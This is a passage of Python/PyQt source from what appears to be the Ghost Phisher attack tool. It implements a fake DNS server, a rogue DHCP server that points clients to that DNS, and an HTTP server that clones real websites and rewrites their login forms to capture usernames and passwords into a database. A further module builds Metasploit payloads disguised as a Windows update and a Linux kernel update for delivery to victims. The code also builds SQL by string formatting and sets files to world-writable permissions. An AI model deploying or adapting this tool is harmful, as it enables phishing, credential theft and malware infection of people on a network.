            self.dns_textbrowser.append('<font color=green>Added \'%s\' resolving as %s</font>'%(website_address,domain_ip_address))
            self.domain_ip.clear()
            self.domain_label.clear()

    def launch_dns(self):
        ''' Launches DNS attack pending on the
            option selected from the radio
            buttons
        '''
        global dns_ip_and_websites

        self.dns_control = 0
        fake_dns_resolution_ip = ''                                             # holds the fake dns resolution ip address
        if self.resolveall_radio.isChecked():
            if str(self.dns_ip_address.text()).count('.') != 3:                 #Check if ip address area is empty
                QtGui.QMessageBox.warning(self,'Invalid Resolution IP Address','Please input a valid Fake IP address of which you want the dns to resolve client queries')
            else:
                fake_dns_resolution_ip += str(self.dns_ip_address.text())
                ghost_settings.create_settings('self.dns_ip_address',fake_dns_resolution_ip)       # Write settings to last settings file
                self.dns_textbrowser.clear()
                self.dns_textbrowser.append('<font color=green>Starting Fake DNS Server....')
                self.dns_start.setEnabled(False)
                self.dns_stop.setEnabled(True)
                thread.start_new_thread(self.dns_server_thread,(None,0))                  # DNS Server thread
        else:
            try:
                dns_ip_and_websites.keys()[0]
                self.dns_textbrowser.clear()
                self.dns_textbrowser.append('<font color=green>Starting Fake DNS Server....')
                self.dns_start.setEnabled(False)
                self.dns_stop.setEnabled(True)
                thread.start_new_thread(self.dns_server_thread,(1,0))
            except IndexError:
                QtGui.QMessageBox.warning(self,"Empty IP to Website address mappings","Seems you forgot to add websites and IP addresses using the (Add) button")
                self.domain_add_button.setFocus()




    #########################################################################
    #       FAKE DHCP SERVER DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

    def determine_subnet(self):
        ''' Determines the subnet mask from the
            live ip address input of user
        '''
        start_ip = str(self.start_ip.text())
        try:
            period_number = start_ip.index('.')
            first_octect = start_ip[0:period_number]
            if int(first_octect) in range(1,127):               # Class A IP address (netmask will be 255.0.0.0)
                self.subnet_ip.setText('255.0.0.0')
            elif int(first_octect) in range(128,191):           # Class B IP address (netmask will be 255.255.0.0)
                self.subnet_ip.setText('255.255.0.0')
            else:
                self.subnet_ip.setText('255.255.255.0')         # Class C IP address (netmask will be 255.255.255.0)
        except ValueError:
            pass


    def stop_dhcp(self):
        ''' Stop the DHCP Server'''

        global dhcp_config_file
        global dhcp_pid_file

        self.dhcp_start.setEnabled(True)
        self.dhcp_stop.setEnabled(False)

        if os.path.exists("/var/lib/dhcp3/dhcpd.leases"):
            os.remove("/var/lib/dhcp3/dhcpd.leases")

        #start-stop-daemon --stop --quiet --pidfile $DHCPDPID
        if os.path.exists(dhcp_pid_file):
            dhcp_pid = open(dhcp_pid_file).read().strip()
            stop_dhcp_status = commands.getstatusoutput('kill -9 %s' % dhcp_pid)
            #stop_dhcp_status = commands.getstatusoutput('/etc/init.d/dhcp3-server stop')

        self.dhcp_status.append('<font color=red>DHCP Server stopped at %s'%(time.ctime()))


    def launch_dhcp(self):
        ''' Launch DHCP spoofing if all
            conditions are right
        '''
        global dhcp_subnet
        global dhcp_installation_status
        global dhcp_server_binary
        global dhcp_config_file
        global dhcp_pid_file

        start_ip = str(self.start_ip.text())
        stop_ip = str(self.stop_ip.text())
        gateway_ip = str(self.gateway_ip.text())
        fakedns_ip = str(self.fakedns_ip.text())
        subnet_ip = str(self.subnet_ip.text())
        alternatedns_ip = str(self.alternatedns_ip.text())

        lease_file = open("/var/lib/dhcp3/dhcpd.leases",'a+')
        lease_file.close()
        os.chmod("/var/lib/dhcp3/dhcpd.leases",0777)

        if dhcp_installation_status == 'not installed':
            self.dhcp_status.append('<font color=green>DHCP3 Server is not installed run:</font>\t<font color=red>"apt-get install dhcp3-server" to install</font>')
        elif start_ip.count('.') != 3:                                   # Check if inputed data is valid
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (From:) section")
        elif stop_ip.count('.') != 3:
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (To:) section")
        elif gateway_ip.count('.') != 3:
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Gateway Address:) section")
        elif fakedns_ip.count('.') != 3:
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Fake DNS IP:) section, input the address from the fake DNS")
        elif alternatedns_ip.count('.') != 3:
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Alternate  DNS IP :) section, is best you input a real DNS server IP address here to fasten HTTP responce on an intranet based networks")
        else:
            ghost_settings.create_settings('self.start_ip',start_ip)                   # Write settings to last_settings file
            ghost_settings.create_settings('self.stop_ip',stop_ip)
            ghost_settings.create_settings('self.fakedns_ip',fakedns_ip)
            ghost_settings.create_settings('self.gateway_ip',gateway_ip)
            ghost_settings.create_settings('self.subnet_ip',subnet_ip)
            ghost_settings.create_settings('self.alternatedns_ip',alternatedns_ip)

            # update:
            #   start dhcp server using a custom config file.




            # if 'dhcpd.conf_original' in os.listdir('/etc/dhcp3/'):      # Remove dhcpd.conf file if ghost_phiser had earlierly created it to avoid using old settings
            #    if 'dhcpd.conf' in os.listdir('/etc/dhcp3'):
            #        os.remove('/etc/dhcp3/dhcpd.conf')
            # else:
            #     os.rename('/etc/dhcp3/dhcpd.conf','/etc/dhcp3/dhcpd.conf_original')     # Backup your original dhcp settings if they exist


            if subnet_ip == '255.0.0.0':                                # Class A subnet and broadcast address
                process = start_ip[0:start_ip.index('.')]
                broadcast = process + '.255.255.255'
                subnet = process + '.0.0.0'

            elif subnet_ip == '255.255.0.0':                            # Class B subnet and broadcast address
                process = start_ip[0:start_ip.rindex('.')-2]
                broadcast = process + '.255.255'
                subnet = process + '.0.0'
            else:
                process = start_ip[0:start_ip.rindex('.')]              # Class C  subnet and broadcast address
                broadcast = process + '.255'
                subnet = process + '.0'

                                                                        # DHCP3 Server configuration file
            dhcp_settings_string = '''
            ddns-update-style none;

            option domain-name-servers %s, %s;

            default-lease-time 86400;
            max-lease-time 604800;

            authoritative;

            subnet %s netmask %s {
                    range %s %s;
                    option subnet-mask %s;
                    option broadcast-address %s;
                    option routers %s;
            }
            '''

            dhcp_settings_file = dhcp_settings_string % (fakedns_ip,alternatedns_ip,subnet,subnet_ip,\
                                                         start_ip,stop_ip,subnet_ip,broadcast,gateway_ip)

            if os.path.exists(dhcp_config_file):
                os.remove(dhcp_config_file)

            if os.path.exists(dhcp_pid_file):
                os.remove(dhcp_pid_file)

            dhcp_settings = open(dhcp_config_file,'a+')
            dhcp_settings.write(dhcp_settings_file)
            dhcp_settings.close()

            os.chmod(dhcp_config_file,0777) # Dump permission to file,so we do not get permission denies

            cmd = "%s -cf %s -pf %s" % (dhcp_server_binary, dhcp_config_file, dhcp_pid_file)
            dhcp_status = commands.getstatusoutput(cmd)

            if dhcp_status[0] == 0:
                self.dhcp_status.clear()
                self.dhcp_status.append('<font color=green>%s at %s </font>'%(dhcp_status[1],time.ctime()))  # DHCP ran successfully
                self.dhcp_status.append(" ")
                thread.start_new_thread(self.check_leases_changes,())                                       # Periodically check lease file for changes
                self.dhcp_start.setEnabled(False)
                self.dhcp_stop.setEnabled(True)
            else:
                self.dhcp_status.clear()
                for dhcp_failure in dhcp_status[1].splitlines():
                    self.dhcp_status.append('<font color=red>%s</font>'%(dhcp_failure))  # DHCP did not run successfully


    def check_leases_changes(self):
        lease_length = int()
        while not self.dhcp_start.isEnabled():
            time.sleep(2)
            lease_file = open('/var/lib/dhcp3/dhcpd.leases')
            temp = lease_file.read()
            if(int(temp.count("client-hostname")) != lease_length):
                self.emit(QtCore.SIGNAL("new dhcp connection"))
                lease_length += 1
            lease_file.close()


    def display_leases_client(self):
        lease_file = open('/var/lib/dhcp3/dhcpd.leases')
        string = lease_file.read()
        regex = re.compile("(\d+\.\d+\.\d+\.\d+)")              # IP Address regular expression
        regex_host = re.compile('client-hostname ("\S*")')      # Host name regular expression

        client_address = regex.findall(string)
        unique_address = list(set(client_address))
        for address in unique_address:
            location = string.index(str(address))
            string_process = string[location:-1]
            for process in string_process.splitlines():
                if regex_host.search(process):
                    self.lease_process(regex_host.findall(process)[0],address)
                    break

        lease_file.close()


    def lease_process(self,host_name,address):
        if not self.dhcp_cache.has_key(host_name):
            self.dhcp_cache[host_name] = address
            self.dhcp_status.append('<font color=blue>' + host_name + ' has been leased ' + address + '</font>')
        else:
            if self.dhcp_cache[host_name] != address:
                self.dhcp_cache[host_name] = address
                self.dhcp_status.append('<font color=blue>' + host_name + " has been leased " + address + '</font>')











    #########################################################################
    #       FAKE HTTP SERVER DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

    def HTTP_initialization(self):
        '''Starts and read HTTP server responces'''
        global http_terminal
        global http_control
        global request_response
        global http_server_port

        html_folder = ''                                        # Get the html resource directory e.g index_files
        for file_ in os.listdir(cwd + '/HTTP-Webscript/'):
            if os.path.isdir(cwd + '/HTTP-Webscript/' + file_):
                html_folder += file_

        if not bool(html_folder):
            html_folder = 'Null'

        self.fake_http_object = GhostHTTPServer('0.0.0.0',http_server_port,html_folder,cwd,self.form_variables[0],self.form_variables[1]) # Username/Password varaible are from the form pages
        self.connect(self.fake_http_object,QtCore.SIGNAL("new credential"),self.new_credential)
        self.connect(self.fake_http_object,QtCore.SIGNAL("new remote host"),self.new_host)
        os.environ["ghost_fake_http_control"] = "start"           # Control the fake http process from API (True == Start Server)
        self.fake_http_object.start()



    def stop_http(self):
        ''' Stop the DHCP Server'''
        global http_terminal
        global http_control
        global http_address                 # Holds the address where Fake HTTP server is running e.g http://192.168.0.1/
        http_control = 1
        self.http_start.setEnabled(True)
        self.fake_http_object.quit()        # Kill fake HTTP Server
        self.http_stop.setEnabled(False)
        os.environ["ghost_fake_http_control"] = "stop"           # Control the fake http process from API (False == Stop Server)
        self.status_textbrowser_http.append('<font color=red>HTTP Server Stopped at: %s</font>'%(time.ctime()))
        self.http_ip_label.setText('<font color=green>Service running on:</font>  Service not started')
        self.label_13.setText('<font color=green>Runtime:</font>  Service not started')




    def new_host(self):
        '''logs remote host details'''
        self.status_textbrowser_http.append('<font color=blue>' + self.fake_http_object.remote_connection + '</font>')



    def new_credential(self):
        ''' Inputs data to Database Table after
            quering from database file
        '''
        global captured_credential

        raw_website = str(self.lineEdit_2.text())
        raw_username = str(self.fake_http_object.credentials[0])
        raw_password = str(self.fake_http_object.credentials[1])

        self.database_commit(raw_website,raw_username,raw_password)

        database_items = self.fetch_data()
        items = str(database_items).count('u')
        try:
            for iterate in range(0,items/3):
                self.credential_table.removeRow(iterate)
                self.credential_table.insertRow(iterate)

                current_credential = database_items[iterate]           # Hold data like (u'www.foo-bar.com',u'username',u'password)

                website = QtGui.QTableWidgetItem()
                username = QtGui.QTableWidgetItem()
                password = QtGui.QTableWidgetItem()

                website.setText(current_credential[0])
                self.credential_table.setItem(iterate,0,website)
                username.setText(current_credential[1])
                self.credential_table.setItem(iterate,1,username)
                password.setText(current_credential[2])
                self.credential_table.setItem(iterate,2,password)
        except IndexError:
            pass
        captured_credential += 1
        self.http_captured_credential.setText('captured credentials:<font color=green>\t %s</font>'%(captured_credential))




    def set_usable(self):
        ''' Disables un-used settings buttons if
            not selected
        '''
        if self.emulate_website_radio.isChecked():
            self.website_button.setEnabled(False)
            try:
                self.emulate_website_label.setPlaceholderText("http:// or https://")
            except:
                self.emulate_website_label.setText("http:// or https://")
                self.emulate_website_label.selectAll()
                self.emulate_website_label.setFocus()
            self.website_linedit.clear()

        else:
            self.website_button.setEnabled(True)
            self.emulate_website_label.clear()



    def update_http_address(self):
        ''' Changes the ipaddress on ip combo when
            user changes the index of http interface
            card combobox
        '''
        global usable_interface_cards   # Dictionary holding IP / Interface card mappings

        ip_address = []                 #Holds ip address of the selected card

        selected_http_interface_card = str(self.http_interface_combo.currentText())   #currently selected interface card
        try:
            ip_address.append(usable_interface_cards[selected_http_interface_card])
        except KeyError:
            pass
        self.http_ip_combo.clear()                                       #clear the ip address combo
        self.http_ip_combo.addItems(ip_address)                          #display ip address on combo
        self.current_card_label_2.setText("<font color=green>\
                                        Current Interface:</font>  %s"%(selected_http_interface_card))


    def browse_webpage(self):
        ''' Browse and select webpages that
            are intended to be hosted
        '''
        webpage = QtGui.QFileDialog.getOpenFileName(self,"Select Webpage","","HTML Scripts(*.html *.htm)")
        if webpage != '':
            self.website_linedit.setText(webpage)
            ghost_settings.create_settings('self.website_linedit',webpage)

        if os.path.exists(cwd + '/HTTP-Webscript'):
            shutil.rmtree(cwd + os.sep + 'HTTP-Webscript')



    def launch_http_server(self):
        ''' Evaluates user settings and launches
            webserver to host web-script
        '''
        self.status_textbrowser_http.clear()

        if self.capture_radio.isChecked():                          # Capture Mode is enabled
            if len(str(self.lineEdit_2.text())) < 3:
                QtGui.QMessageBox.warning(self,'Invalid URL or IP address','Please input the original url or ip address of the spoofed website')
            else:
                self.start_http_service()
        else:
            self.start_http_service()


    def start_http_service(self):
        '''Starts the HTTP Service'''
        global html_source
        global http_address
        global http_server_port

        http_error = 0               # Informs conditional blocks of success of other blocks

        actions_ip_address = str(self.http_ip_combo.currentText())

        if self.run_webpage_port_radio.isChecked():     # Check if http port section has been changed
            try:
                http_server_port = int(self.use_port_http.text())
            except ValueError:
                QtGui.QMessageBox.warning(self,"Invalid Port Number","Please input a valid port number on the (Run Webpage on Port :) section")

        if os.path.exists(cwd + '/HTTP-Webscript'):     # Create web directory if it does not exist
            shutil.rmtree(cwd + '/HTTP-Webscript')
        os.mkdir(cwd + '/HTTP-Webscript')

        if 'Ghost-Phisher-Database' not in os.listdir(cwd): # Create Database directory
            os.mkdir('Ghost-Phisher-Database')



        if self.select_website_radio.isChecked():

            web_script = str(self.website_linedit.text())
            webserver_path = cwd + os.sep + 'HTTP-Webscript' + os.sep

            if not web_script:
                http_error += 1
                QtGui.QMessageBox.warning(self,"Invalid Web-Script","Please browse and select a web-script to host from the (Select Webpage:) section")
            else:
                self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')

                html_file = web_script.split('/')[-1]           # Holds file name like (index.html)
                html_name = re.findall("(\S*)\.",html_file)[0]            # Holds variable like (index)
                folder_path = web_script.replace(html_file,"")

                html_folder = ""                           # Holds folder name like (index_files)

                if os.path.exists(folder_path + html_name + "_files"):
                    html_folder = str(html_name + "_files")
                    html_file_folder = folder_path + html_name + "_files"
                elif os.path.exists(folder_path + html_name + "_FILES"):
                    html_folder = str(html_name + "_FILES")
                    html_file_folder = folder_path + html_name + "_FILES"   # html_file_folder = /root/Desktop/index_files
                else:
                    html_folder = None
                    html_file_folder = None

                shutil.copyfile(web_script,webserver_path + html_file)

                if html_file_folder:
                    shutil.copytree(html_file_folder,webserver_path + html_folder)

                try:
                    os.rename('%s/HTTP-Webscript/%s'%(cwd,html_file),'%s/HTTP-Webscript/index.html'%(cwd))               # rename our webscript to what the web server can host

                    self.status_textbrowser_http.append('<font color=green>Moving webscript files to Web-Server directory...</font>')

                except OSError,e:
                    self.status_textbrowser_http.append('<font color=red>Unable to start HTTP Server: %s</font>'%(e))
                    http_error += 1

        else:
            website_url = str(self.emulate_website_label.text())
            if len(website_url) > 7:
                self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
                if os.path.exists(cwd + '/HTTP-Webscript'):
                    shutil.rmtree(cwd + os.sep + 'HTTP-Webscript') # Remove old html files already there
                os.mkdir(cwd + '/HTTP-Webscript')
                try:
                    url_source = urllib2.urlopen(website_url)                    # Get the source code of the website and write an HTML file of the website
                    web_script = open('HTTP-Webscript/index.html','a+')
                    web_script.write(url_source.read())
                    self.status_textbrowser_http.append('<font color=green>Successfully cloned %s</font>'%(website_url))
                    web_script.close()
                except(urllib2.URLError):
                    self.status_textbrowser_http.append('<font color=red>Unable to fetch and clone website: network timeout</font>')
            else:
                QtGui.QMessageBox.warning(self,"Invalid URL","Please input a valid url to the (Clone Website:) text area \n e.g http://www.foo-bar.com")

            #
            # Giving the file and Database directory run permission, else HTTP server will not submit any POST request
            #
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)

        if self.dns_control == 0:
            if http_server_port == 80:
                http_address = 'http://%s/'%(str(self.lineEdit_2.text()))  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
            else:
                http_address = 'http://%s:%s/'%(str(self.lineEdit_2.text(),http_server_port))    # Evaluate server address e,g http://192.168.0.23:8080/

        else:
            actions_ip_address = str(self.http_ip_combo.currentText())
            if http_server_port == 80:
                http_address = 'http://%s/'%(actions_ip_address)  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
            else:
                http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)    # Evaluate server address e,g http://192.168.0.23:8080/

        html_file = open('%s/HTTP-Webscript/index.html'%(cwd))
        html_source = html_file.read()

        if self.capture_radio.isChecked():                                                      # Capture Mode is enabled
            form_login_variables = []

            regex_post = re.compile('<label\s*for\S*">',re.IGNORECASE)
            regex_post_process = re.compile('name="(\S*)"',re.IGNORECASE)
            regex = re.compile("action\S*|action\s*=\s*\S*",re.IGNORECASE)                      # Matches any html "action" variable

            new_post_action = regex.sub('action="/login.php"',html_source)          # Replaces action variable with ours e.g <action="http://192.168.0.23/login.php">

            for forms in enumerate(regex_post.findall(new_post_action)):
                pos = new_post_action.index(forms[1])
                new_string = new_post_action[pos:-1]

                for login_form in regex_post_process.findall(new_string):
                    form_login_variables.append(login_form)

            self.form_variables = form_login_variables       # Store to database, website form variables e.g ['email','pass']
            ghost_settings.create_settings('self.lineEdit_2',str(self.lineEdit_2.text()))
            #
            # Check if html source has a valid Post action method
            #
            os.remove('%s/HTTP-Webscript/index.html'%(cwd))                     # Remove index script
            new_html_file = open('%s/HTTP-Webscript/index.html'%(cwd),'a+')     # Rewrite to incude our new action url
            new_html_file.write(new_post_action)
            new_html_file.close()

            self.status_textbrowser_http.append('<font color=green>Scanning packets for possible login details')


        else:                                                              # Hosting Mode is enabled
            self.status_textbrowser_http.append('<font color=green>Website Hosting activated</font>')



        if http_error == 0:      # Means that we hitted this block without any errors from the other blocks
            self.http_start.setEnabled(False)
            self.http_stop.setEnabled(True)
            self.http_captured_credential.setText('captured credentials:')
            self.http_port_label.setText('<font color=green>TCP Port:</font> %s'%(http_server_port))
            self.http_ip_label.setText('<font color=green>Service running on:</font>  %s'%(actions_ip_address))
            self.label_13.setText('<font color=green>Runtime:</font>  %s'%(time.ctime()))

            if os.path.exists('/tmp/original.html'):                    # Delete original source if it already exist in the tmp directory
                os.remove('/tmp/original.html')

            original_source = open('/tmp/original.html','a+')
            original_source.write(html_source)
            original_source.close()

################# HERERERERERERER######################################################################
            thread.start_new_thread(self.HTTP_initialization,())        # Start HTTP Sever thread


            if http_server_port == 80:
                http_address = 'http://%s/'%(actions_ip_address)
                self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
            else:
                http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)
                self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))

            self.status_textbrowser_http.append('')







    #########################################################################
    #       CREDENTIAL HARVEST DEFINITION ,FUNCTIONS AND SIGNALS            #
    #########################################################################


    def database_commit(self,website,username,password):
        ''' Commits captured credential to database'''
        database = sqlite3.connect(cwd + '/Ghost-Phisher-Database/' + 'database.db')
        database_query = database.cursor()
        database_query.execute('create table if not exists credentials (website text, username text, password text)')
        database_query.execute("insert into credentials values ('%s','%s','%s')"% (website,username,password))
        database.commit()
        database.close()


    def fetch_data(self):
        ''' Function searches for new entries in database
            and displays it on the database table
        '''
        if 'Ghost-Phisher-Database' not in os.listdir(cwd):
            os.mkdir(cwd + '/Ghost-Phisher-Database')
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)
        database_read = sqlite3.connect(cwd + '/Ghost-Phisher-Database/' + 'database.db')
        os.chmod('%s/Ghost-Phisher-Database/database.db'%(cwd),0777)
        database_query = database_read.cursor()
        database_query.execute('create table if not exists credentials (website text, username text, password text)')
        database_query.execute('select * from credentials')
        database_values = database_query.fetchall()
        database_read.close()
        return database_values



    def insert_credential(self):
        ''' insert a new row on the database table'''
        self.credential_table.insertRow(0)


    def delete_credential(self):
        ''' deletes current row on the database table'''
        selected_row = self.credential_table.currentRow()
        self.credential_table.removeRow(selected_row)


    def save_changes(self):
        ''' Removes our old database,creates a new
            one and commits changes to the new
            database
        '''
        if 'Ghost-Phisher-Database' not in os.listdir(cwd):
            os.mkdir(cwd + '/Ghost-Phisher-Database')
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)
        if 'database.db' in os.listdir(cwd + '/Ghost-Phisher-Database'):
            os.remove(cwd + '/Ghost-Phisher-Database/' + 'database.db')

        row_number = self.credential_table.rowCount()

        for iterate in range(0,row_number):
            try:
                website = QtGui.QTableWidgetItem(self.credential_table.item(iterate,0))
                username = QtGui.QTableWidgetItem(self.credential_table.item(iterate,1))
                password = QtGui.QTableWidgetItem(self.credential_table.item(iterate,2))
                self.database_commit(website.text(),username.text(),password.text())        # Save data to database
            except TypeError:
                QtGui.QMessageBox.warning(self,'Null Field Detected','Please remove white spaces or rows with empty data')

        try:
            os.chmod('%s/Ghost-Phisher-Database/database.db'%(cwd),0777)
        except OSError:
            pass



    #######################################################
    #           GHOST TRAP FUNCTIONS AND SIGNALS          #
    #######################################################

    def update_ghost_spawn_interfaces(self):
        ''' Changes the ipaddress on ip combo when
            user changes the index of interface combo
        '''
        global usable_interface_cards

        ip_address = []             #Holds ip address of the selected card

        selected_interface = str(self.spawn_http_interface_combo.currentText())   #currently selected interface card
        try:
            ip_address.append(usable_interface_cards[selected_interface])
        except KeyError:
            pass
        self.spawn_ip_combo.clear()                                       #clear the ip address combo
        self.spawn_ip_combo.addItems(ip_address)                          #display ip address on combo
        self.ip_address_edit.setText(self.spawn_ip_combo.currentText())



    def vulnarabilty_page_choice(self):
        if(self.ghost_vul_combo.isChecked()):
            self.custom_page_label_2.setEnabled(False)
            self.custom_page_button.setEnabled(False)
            self.custom_page_label.setEnabled(False)
        else:
            self.custom_page_label_2.setEnabled(True)
            self.custom_page_button.setEnabled(True)
            self.custom_page_label.setEnabled(True)


    def metasploit_payload_choice(self):
        self.metasploit_installation()
        self.metasploit_settings_box.setVisible(True)
        self.custom_payload_box.setVisible(False)
        self.custom_payload_radio.setChecked(False)



    def custom_payload_choice(self):
        self.ghost_spawn_start.setEnabled(True)
        self.ghost_spawn_stop.setEnabled(False)
        self.ghost_spawn_browser.clear()
        self.metasploit_settings_box.setVisible(False)
        self.custom_payload_box.setVisible(True)
        self.metasploit_payload_radio.setChecked(False)


    def encode_number_list(self):
        encode_int = []
        for number in range(1,17):
            encode_int.append(str(number))
        self.comboBox_2.addItems(encode_int)


    def metasploit_payloads(self):
        self.encode_combo.addItems(variables.metasploit_encoders)
        self.linux_payload_combo.addItems(variables.metasploit_linux_payloads)
        self.windows_payload_combo.addItems(variables.metasploit_windows_payloads)


    def metasploit_is_installed(self):
        msfconsole = commands.getstatusoutput('which msfconsole')[0]
        msfencode = commands.getstatusoutput('which msfencode')[0]
        msfpayload = commands.getstatusoutput('which msfpayload')[0]

        if bool(msfconsole) and bool(msfencode) and bool(msfpayload):
            return(False)
        return(True)



    def metasploit_installation(self):
        if not self.metasploit_is_installed():
            self.ghost_spawn_browser.clear()
            self.ghost_spawn_browser.append('<font color=red>Metasploit framework is currently not installed on this\
            computer, please visit </font><font color=blue><a href="http://www.metasploit.com/">http://www.metasploit.com/</a></font><font color=red> to get a working copy</font>')
            self.metasploit_settings_box.setEnabled(False)
            self.ghost_spawn_start.setEnabled(False)
            self.ghost_spawn_stop.setEnabled(False)


    def browse_custom_webpage(self):
        self.custom_spawn_page_path = str(QtGui.QFileDialog.getOpenFileName(self,"Browse Webpage","","HTML Files(*.html *.htm)"))
        if self.custom_spawn_page_path:
            self.custom_page_label_2.setText(self.custom_spawn_page_path)


    def custom_windows_executable_payload(self):
        if not self.windows_exec_checkbox.isChecked():
            QtGui.QMessageBox.warning(self,"Custom windows payload not selected","Please click on the windows checkbox to activate this option")
        else:
            self.custom_windows_exec_path = str(QtGui.QFileDialog.getOpenFileName(self,"Browse Windows Executable",""))

            if self.custom_windows_exec_path:
                self.windows_exec_edit.setText(self.custom_windows_exec_path)


    def custom_linux_executable_payload(self):
        if not self.linux_exec_checkbox.isChecked():
            QtGui.QMessageBox.warning(self,"Custom Linux payload not selected","Please click on the linux checkbox to activate this option")
        else:
            self.custom_linux_exec_path = str(QtGui.QFileDialog.getOpenFileName(self,"Browse Linux Executable",""))

            if self.custom_linux_exec_path:
                self.linux_exec_edit.setText(self.custom_linux_exec_path)


    # USER PROCESS DISPLAY

    def clear_all_displays(self):
        self.ghost_spawn_browser.clear()
        self.nitialize_label.setEnabled(False)
        self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.setting_payload_label.setEnabled(False)
        self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.create_cache_label.setEnabled(False)
        self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.http_start_label.setEnabled(False)
        self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))


    def display_initialization(self,status):
        self.ghost_spawn_browser.clear()

        if self.dns_control:
            self.display_error_message("DNS Server is currently not started,\
            it recommended that you use this attack with the DNS server for optimum client redirections")

        if status:
            self.ghost_spawn_browser.append('<font color=green>Starting Internal Processes...</font>')
            self.nitialize_label.setEnabled(True)
            self.initlaize_led.setPixmap(QtGui.QPixmap(self.green_led))
        else:
            self.nitialize_label.setEnabled(False)
            self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))



    def display_payload_initlializaton(self,status):
        if status:
            self.setting_payload_label.setEnabled(True)
            self.payload_led.setPixmap(QtGui.QPixmap(self.green_led))
        else:
            self.setting_payload_label.setEnabled(False)
            self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))


    def display_cache_initialization(self,status):
        if status:
            self.create_cache_label.setEnabled(True)
            self.cache_led.setPixmap(QtGui.QPixmap(self.green_led))
        else:
            self.create_cache_label.setEnabled(False)
            self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))


    def display_http_initlialization(self,status):
        if status:
            self.http_start_label.setEnabled(True)
            self.start_http_led.setPixmap(QtGui.QPixmap(self.green_led))
        else:
            self.http_start_label.setEnabled(False)
            self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))


    def display_error_message(self,message):
        self.ghost_spawn_browser.append('<font color=red>' + message + '</font>')

    def display_information(self,color,message):
        self.ghost_spawn_browser.append('<font color=%s>%s</font>'%(color,message))


    def display_new_connection(self):
        self.display_information("blue",ghost_trap_http.control_settings['new connection'])


    def new_download(self):
        self.display_information("blue",ghost_trap_http.control_settings['new download'])



    # METASPLOIT PAYlOAD ERRORS

    def metasploit_windows_error(self):
        self.display_error_message("Metasploit Windows Payload Creation failed: %s"%(\
        self.metasploit_object.variables['windows payload error']))
        self.metasploit_object.terminate()


    def metasploit_linux_error(self):
        self.display_error_message("Metasploit Linux Payload Creation failed: %s"%(\
        self.metasploit_object.variables['linux payload error']))
        self.metasploit_object.terminate()

    # Stop GHOST TRAP SERVER

    def ghost_trap_stop(self):
        os.environ["ghost_trap_http_server"] = "stop"
        ghost_trap_http.cookies = []
        self.ghost_spawn_stop.setEnabled(False)
        self.ghost_spawn_start.setEnabled(True)
        self.display_error_message("Stopped at %s"%(time.ctime()))
        self.nitialize_label.setEnabled(False)
        self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.setting_payload_label.setEnabled(False)
        self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.create_cache_label.setEnabled(False)
        self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.http_start_label.setEnabled(False)
        self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))
        commands.getstatusoutput("killall xterm")


    # EVALUATE USER OPTIONS


    def launch_ghost_trap(self):
        self.clear_all_displays()
        os.environ["ghost_trap_http_server"] = "start"                                  # Activates Ghost Trap Http Server API

        if self.ghost_vul_combo.isChecked():
            ghost_trap_http.control_settings['windows_webpage'] = str(os.getcwd()) + '/Cache/WEBPAGES/windows_default.htm'   # Ghosts Default vulnerability Page
            ghost_trap_http.control_settings['linux_webpage'] = str(os.getcwd()) + '/Cache/WEBPAGES/linux_default.htm'   # Ghosts Default vulnerability Page
            self.display_initialization(True)
            self.Stage_2_process()
        else:
            if not self.custom_page_label_2.text():
                self.clear_all_displays()
                QtGui.QMessageBox.warning(self,"Invalid Custom Page Path","Please Browse and select a custom webpage to use")
            else:
                ghost_trap_http.control_settings['windows_webpage']  = str(self.custom_page_label_2.text())   # Use Custom Vulnerability page
                ghost_trap_http.control_settings['linux_webpage']  = str(self.custom_page_label_2.text())
                self.display_initialization(True)
                self.Stage_2_process()


    def Stage_2_process(self):
        if self.metasploit_payload_radio.isChecked():   # If Metasploit Payload is Selected as Choice

            self.metasploit_object = metasploit_payload.metasploit()             # Metasploit Thread class redefined

            ghost_trap_http.control_settings['windows_payload'] = "/tmp/Windows-RPC-KB925256-ENU.exe"
            ghost_trap_http.control_settings['linux_payload'] = "/tmp/kernel_1.72_update_i386.run"

            self.display_payload_initlializaton(True)

            encoder_number = str(self.comboBox_2.currentText())
            encoder_type = str(self.encode_combo.currentText())
            ip_address = str(self.ip_address_edit.text())
            port_setting = str(self.port_setting_edit.text())
            linux_payload = str(self.linux_payload_combo.currentText())
            windows_payload = str(self.windows_payload_combo.currentText())

            self.display_information('green',"Creating Payloads...")

            self.connect(self.metasploit_object,QtCore.SIGNAL("payloads created successfully"),self.Stage_3_process)   # Check if payloads were created successfully
            self.connect(self.metasploit_object,QtCore.SIGNAL('windows payload error'),self.metasploit_windows_error)
            self.connect(self.metasploit_object,QtCore.SIGNAL('linux payload error'),self.metasploit_linux_error)

